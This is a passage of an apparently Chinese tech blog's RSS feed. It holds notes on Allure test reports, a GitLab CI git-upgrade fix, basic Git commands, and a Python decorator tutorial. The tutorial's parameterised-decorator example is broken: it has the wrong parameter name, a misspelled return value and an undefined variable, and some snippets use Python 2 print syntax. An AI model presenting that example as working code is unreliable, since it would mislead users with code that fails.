&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Blocker级别：中断缺陷（客户端程序无响应，无法执行下一步操作）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Critical级别：临界缺陷（ 功能点缺失）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Normal级别：普通缺陷（数值计算错误）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Minor级别：次要缺陷（界面错误与UI需求不符）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Trivial级别：轻微缺陷（必输项无提示，或者提示不规范）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6用例的描述&#34;&gt;6.用例的描述&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 注释即为描述&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;描述
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7alluredynamic动态报告&#34;&gt;7.allure.dynamic()动态报告&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;feature()
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;link()
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;issue()
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;testcase()
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;story()
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;title()
allure&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dynamic&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;description()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—gitlab CI 无法初始化 Git 版本库</title>
        <link>https://ac-lm.github.io/posts/bug/buggitlab-ci-%E6%97%A0%E6%B3%95%E5%88%9D%E5%A7%8B%E5%8C%96-git-%E7%89%88%E6%9C%AC%E5%BA%93/</link>
        <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buggitlab-ci-%E6%97%A0%E6%B3%95%E5%88%9D%E5%A7%8B%E5%8C%96-git-%E7%89%88%E6%9C%AC%E5%BA%93/</guid>
        <description>&lt;h2 id=&#34;bug描述&#34;&gt;BUG描述&lt;/h2&gt;
&lt;p&gt;gitlab CI 报错&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;fatal: git fetch-pack: expected shallow list
fatal: The remote end hung up unexpectedly
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;这是由于 git 版本过老不支持新的 API，需要升级 git&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#安装源&lt;/span&gt;
yum install http://opensource.wandisco.com/centos/7/git/x86_64/wandisco-git-release-7-2.noarch.rpm
&lt;span style=&#34;color:#75715e&#34;&gt;#安装git&lt;/span&gt;
yum install git
&lt;span style=&#34;color:#75715e&#34;&gt;#更新git&lt;/span&gt;
yum update git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/30b6771178cf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; fatal: git fetch-pack: expected shallow list  @0neBean &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Git—版本管理工具</title>
        <link>https://ac-lm.github.io/posts/git/git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/git/git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1git-搭载&#34;&gt;1.Git 搭载&lt;/h2&gt;
&lt;p&gt;搭载 Git 环境，下载安装 Git，&lt;a class=&#34;link&#34; href=&#34;https://git-scm.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Git官网下载 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 github 或者 gitlab 上存在账户&lt;/p&gt;
&lt;p&gt;注意：git 无法追踪一个&lt;strong&gt;空文件夹&lt;/strong&gt;，当用户需要&lt;strong&gt;追踪&lt;/strong&gt;一个空文件夹的时候，可以将一个称为 &lt;strong&gt;.gitkeep&lt;/strong&gt; 的文件放在文件夹里&lt;/p&gt;
&lt;h2 id=&#34;2配置用户名与邮箱&#34;&gt;2.配置用户名与邮箱&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git config --global user.name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;???&amp;#34;&lt;/span&gt;
git config --global user.email &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;????&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# --global 去除则针对单个项目&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3克隆仓库&#34;&gt;3.克隆仓库&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git clone ssh://url
cd somethingtest
touch README.md
git add -A
git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new&amp;#34;&lt;/span&gt;
git push -u origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4上传文件创建仓库&#34;&gt;4.上传文件创建仓库&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd existing_folder
git init
git remote add origin ssh://url
git add -A //.
git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Initial commit&amp;#34;&lt;/span&gt;
git push -u origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5上传文件&#34;&gt;5.上传文件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git add -A
git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Update&amp;#34;&lt;/span&gt;
git push -u origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6拉取文件&#34;&gt;6.拉取文件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git pull origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7强制推送&#34;&gt;7.强制推送&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git push -f origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—装饰器</title>
        <link>https://ac-lm.github.io/posts/python/python%E8%A3%85%E9%A5%B0%E5%99%A8/</link>
        <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E8%A3%85%E9%A5%B0%E5%99%A8/</guid>
        <description>&lt;h2 id=&#34;1什么是装饰器&#34;&gt;1.什么是装饰器&lt;/h2&gt;
&lt;p&gt;装饰器本质上是一个 Python 函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。&lt;/p&gt;
&lt;h2 id=&#34;2举例说明&#34;&gt;2.举例说明&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I am foo&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I am foo&amp;#39;&lt;/span&gt;)
    logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;foo is running&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;bar()、bar2()也有类似的需求，怎么做？再写一个logging在bar函数里？这样就造成大量雷同的代码，为了减少重复写代码，我们可以这样做，重新定义一个函数：专门处理日志 ，日志处理完之后再执行真正的业务代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;use_logging&lt;/span&gt;(func): 
    logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warn(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; is running&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__) 
    func()
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bar&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I am bar&amp;#39;&lt;/span&gt;)

use_logging(bar)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;逻辑上不难理解， 但是这样的话，我们每次都要将一个函数作为参数传递给use_logging函数。而且这种方式已经破坏了原有的代码逻辑结构，之前执行业务逻辑时，执行运行bar()，但是现在不得不改成use_logging(bar)。那么有没有更好的方式的呢？当然有，答案就是装饰器。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;use_logging&lt;/span&gt;(func):     
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wrapper&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs): 
        logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warn(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; is running&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__) 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; wrapper 

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bar&lt;/span&gt;(): 
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;i am bar&amp;#39;&lt;/span&gt;) 

bar &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; use_logging(bar) 
bar()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;函数use_logging就是装饰器，它把执行真正业务方法的func包裹在函数里面，看起来像bar被use_logging装饰了。在这个例子中，函数进入和退出时 ，被称为一个横切面(Aspect)，这种编程方式被称为面向切面的编程(Aspect-Oriented Programming)。&lt;/p&gt;
&lt;p&gt;@符号是装饰器的语法糖，在定义函数的时候使用，避免再一次赋值操作&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;use_logging&lt;/span&gt;(func): 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wrapper&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs): 
        logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warn(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; is running&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__) 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; wrapper 

&lt;span style=&#34;color:#a6e22e&#34;&gt;@use_logging&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(): 
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I am foo&amp;#39;&lt;/span&gt;) 

&lt;span style=&#34;color:#a6e22e&#34;&gt;@use_logging&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bar&lt;/span&gt;(): 
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I am bar&amp;#39;&lt;/span&gt;) 

bar()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如上所示，这样我们就可以省去bar = use_logging(bar)这一句了，直接调用bar()即可得到想要的结果。如果我们有其他的类似函数，我们可以继续调用装饰器来修饰函数，而不用重复修改函数或者增加新的封装。这样，我们就提高了程序的可重复利用性，并增加了程序的可读性。装饰器在Python使用如此方便都要归因于Python的函数能像普通的对象一样能作为参数传递给其他函数，可以被赋值给其他变量，可以作为返回值，可以被定义在另外一个函数内。&lt;/p&gt;
&lt;h2 id=&#34;3带参数的装饰器&#34;&gt;3.带参数的装饰器&lt;/h2&gt;
&lt;p&gt;装饰器还有更大的灵活性，例如带参数的装饰器：在上面的装饰器调用中，比如@use_logging，该装饰器唯一的参数就是执行业务的函数。装饰器的语法允许我们在调用时，提供其它参数，比如@decorator(a)。这样，就为装饰器的编写和使用提供了更大的灵活性。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;use_logging&lt;/span&gt;(func):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decorator&lt;/span&gt;(func):
       &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wrapper&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs): 
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; level &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;warn&amp;#39;&lt;/span&gt;:
                logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warn(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; is running&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__) 
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args) 
       &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; wrapper 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; decortor

&lt;span style=&#34;color:#a6e22e&#34;&gt;@use_logging&lt;/span&gt;(level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;warn&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(): 
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;I am foo&amp;#39;&lt;/span&gt;) 

foo()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的use_logging是允许带参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有参数的闭包。当我 们使用@use_logging(level=&amp;ldquo;warn&amp;rdquo;)调用的时候，Python能够发现这一层的封装，并把参数传递到装饰器的环境中。&lt;/p&gt;
&lt;h2 id=&#34;4类装饰器&#34;&gt;4.类装饰器&lt;/h2&gt;
&lt;p&gt;再来看看类装饰器，相比函数装饰器，类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器还可以依靠类内部的__call__方法，当使用 @ 形式将装饰器附加到函数上时，就会调用此方法。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Foo&lt;/span&gt;(object):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, func):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __call__(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;class running&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_func()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;class ending&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;@Foo&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bar&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;)
bar()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5functoolswraps&#34;&gt;5.functools.wraps&lt;/h2&gt;
&lt;p&gt;使用装饰器极大地复用了代码，但是他有一个缺点就是原函数的元信息不见了，比如函数的docstring、名字、参数列表，先看例子：&lt;/p&gt;
&lt;p&gt;装饰器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;logged&lt;/span&gt;(func): 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;with_logging&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs): 
        print func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; was called&amp;#34;&lt;/span&gt; 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; with_logging
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@logged&lt;/span&gt; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(x): 
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;does some math&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt; 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等价于&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(x): 
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;does some math&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt; 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x 
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; logged(f)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不难发现，函数f被with_logging取代了，当然它的docstring，__name__就是变成了with_logging函数的信息了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;print f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__name__ &lt;span style=&#34;color:#75715e&#34;&gt;# prints &amp;#39;with_logging&amp;#39; &lt;/span&gt;
print f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__doc__ &lt;span style=&#34;color:#75715e&#34;&gt;# prints None&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个问题就比较严重的，好在我们有functools.wraps，wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器函数中，这使得装饰器函数也有和原函数一样的元信息了。&lt;/p&gt;
